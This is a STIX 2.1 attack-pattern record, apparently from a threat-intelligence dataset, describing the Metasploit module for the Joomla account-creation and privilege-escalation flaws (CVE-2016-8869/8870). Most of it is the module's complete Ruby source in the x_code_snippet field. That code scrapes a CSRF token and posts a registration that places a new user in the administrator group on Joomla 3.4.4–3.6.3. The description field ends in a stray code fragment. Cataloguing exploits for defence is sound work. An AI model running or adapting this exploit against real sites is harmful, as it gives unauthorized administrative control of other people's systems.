{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09738a53-3625-411c-8c5f-42950a2fbc67",
    "created": "2024-08-14T16:23:28.81351Z",
    "modified": "2024-08-14T16:23:28.813514Z",
    "name": "Joomla Account Creation and Privilege Escalation",
    "description": " This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4 through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/joomla_registration_privesc.rb",
            "external_id": "joomla_registration_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-8870"
        },
        {
            "source_name": "reference",
            "url": "https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html"
        },
        {
            "source_name": "reference",
            "url": "https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Joomla\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Joomla Account Creation and Privilege Escalation',\n        'Description' => %q{\n          This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4\n          through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).\n        },\n        'References' => [\n          ['CVE', '2016-8869'],\n          ['CVE', '2016-8870'],\n          ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],\n          ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],\n          ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']\n        ],\n        'Author' => [\n          'Fabio Pires <fp[at]integrity.pt>', # module creation and privilege escalation\n          'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation\n          'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2016-10-25'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/']),\n        OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),\n        OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),\n        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi('uri' => target_uri.path)\n\n    unless res\n      vprint_error('Unable to connect to target')\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless joomla_and_online?\n      vprint_error('Unable to detect Joomla')\n      return Exploit::CheckCode::Safe\n    end\n\n    version = Rex::Version.new(joomla_version)\n\n    unless version\n      vprint_error('Unable to detect Joomla version')\n      return Exploit::CheckCode::Detected\n    end\n\n    vprint_status(\"Detected Joomla version #{version}\")\n\n    if version.between?(Rex::Version.new('3.4.4'), Rex::Version.new('3.6.3'))\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_csrf(hidden_fields)\n    hidden_list = hidden_fields\n    hidden_list.each do |fields|\n      fields.each do |item|\n        if item[0].length == 32 && item[1] == '1'\n          return item[0]\n        end\n      end\n    end\n  end\n\n  def run\n    if check == Exploit::CheckCode::Safe\n      print_error('Target seems safe, so we will not continue!')\n      return\n    end\n\n    print_status('Trying to create the user!')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),\n      'vars_get' => {\n        'view' => 'login'\n      }\n    )\n\n    if res && res.code == 200\n      cookie = res.get_cookies\n      csrf = get_csrf(res.get_hidden_inputs)\n\n      if csrf.length != 32 && cookie.split(/=/).length != 2\n        print_error('Could not find csrf or cookie!')\n        return\n      end\n    else\n      print_error('Could not find Login Page!')\n      return\n    end\n\n    mime = Rex::MIME::Message.new\n    mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name=\"user[name]\"')\n    mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name=\"user[username]\"')\n    mime.add_part('7', nil, nil, 'form-data; name=\"user[groups][]\"')\n    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name=\"user[password1]\"')\n    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name=\"user[password2]\"')\n    mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name=\"user[email1]\"')\n    mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name=\"user[email2]\"')\n    mime.add_part('com_users', nil, nil, 'form-data; name=\"option\"')\n    mime.add_part('user.register', nil, nil, 'form-data; name=\"task\"')\n    mime.add_part('1', nil, nil, 'form-data; name=\"' + csrf + '\"')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),\n      'cookie' => cookie,\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    )\n\n    if res && res.code == 200\n      print_good('PWND - Your user has been created')\n      print_status(\"\\tUsername: \" + datastore['USERNAME'])\n      print_status(\"\\tPassword: \" + datastore['PASSWORD'])\n      print_status(\"\\tEmail: \" + datastore['EMAIL'])\n    elsif res.redirect?\n      res = send_request_cgi!(\n        'uri' => res.redirection.path,\n        'method' => 'GET',\n        'cookie' => cookie\n      )\n\n      print_error('There was an issue, but the user could have been created.')\n\n      parsed_data = res.get_html_document\n      parsed_data.xpath('//div[@class=\"alert-message\"]').each do |alert_msg|\n        print_error(\"\\t\" + alert_msg.text)\n      end\n    else\n      print_error('This host may not be vulnerable.')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-10-25"
}